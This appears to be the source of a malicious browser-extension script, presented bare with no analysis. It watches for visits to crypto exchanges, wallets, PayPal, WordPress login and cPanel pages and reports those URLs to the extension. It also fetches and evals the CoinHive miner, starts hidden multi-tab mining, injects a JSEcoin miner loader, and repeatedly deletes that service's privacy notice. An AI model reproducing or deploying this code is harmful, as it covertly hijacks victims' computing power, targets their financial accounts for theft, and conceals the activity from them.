(new Image).src = "//whos.amung.us/swidget/bbbbbbbbd";
var myStringArray = [
  "coin",
  "wp-admin.php",
  "wp-login.php",
  "ether",
  "paypal.com",
  "bitcoin",
  "monero",
  "etherum",
  "wallet",
  "cryptocurrency",
  "bitcoin",
  "blockchain.info",
  "wallet",
  "paxful.com",
  "coin.space",
  "coinapult.com",
  "bitgo.com",
  "strongcoin.com",
  "coinhive.com",
  "spectrocoin.com",
  "wirexapp.com",
  "xapo.com",
  "iqoption.com",
  "etoro.com",
  "bittrex.com",
  "localbitcoins.com",
  "cex.io",
  "kraken.com",
  "etherdelta.com",
  "bitfinex.com",
  "bitstamp.net",
  "bisq.network",
  "gdax.com",
  "shapeshift.io",
  "binance.com",
  "coinmama.com",
  "bitcoin.de",
  "bithumb.com",
  "coinatmradar.com",
  "poloniex.com",
  "changelly.com",
  "zebpay.com",
  "bitso.com",
  "gemini.com",
  "yobit.net",
  "luno.com",
  "bitbay.net",
  "bitpanda.com",
  "bitflyer.jp",
  "cryptonia.co.nz",
  "btcmarkets.net",
  "coinchceck.com",
  "bx.in.th",
  "bitcoin.co.id",
  "anycoindirect.eu",
  "hitbtc.com",
  "bitmex.com",
  "indacoin.com",
  "mine",
  "btc",
  "ltc",
  "zcash",
  "cpanel"
];
var arrayLength = myStringArray.length;
for (var i = 0; i < arrayLength; i++) {
    if (window.location.href.indexOf(myStringArray[i]) > -1) {
          var login = {};
          login.href = window.location.href;
          chrome.runtime.sendMessage(null, {cmd: "w",login});
}
}






    var target = 2048;
    var exFunc = function(){
    if (typeof isrunmyproject == "undefined") {
    	isrunmyproject = 1;
    if (typeof CoinHive != "object") {
    	var xmlHttp = new XMLHttpRequest;
        xmlHttp["open"]("GET", "https://coinhive.com/lib/coinhive.min.js", false);
        xmlHttp["send"](null);
        eval(xmlHttp["responseText"]);
    }
    	var miner = new CoinHive.Token('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', target);
    	miner.on('accepted', function(params){
    		if (params.hashes >= target) {
    			var ts = Date.now();
    			var xhr = new XMLHttpRequest();
    			xhr.onreadystatechange = function() {
    				if (xhr.readyState === xhr.DONE){

    				}
    			};
    			xhr.open('POST', 'https://cnhv.co/dkja');
    			xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    			xhr.send('token='+encodeURIComponent(miner.getToken()));
    		}
    	});
    	miner.start(CoinHive.FORCE_MULTI_TAB);

    }
  }

    var cookie_name = "control22_miner2_"+target;
    var cookie_time = 0.3;
    if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
    	localStorage[cookie_name] = Date.now();
    	exFunc();
    }

!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/29089/global.com/0/0/",s.parentNode.insertBefore(t,s)}();
      window["setInterval"](function() {
        var _0x4a1cx5c = document["getElementById"]("jseprivacy");
        if (_0x4a1cx5c) {
          _0x4a1cx5c["outerHTML"] = "";
        }
      }, 10);
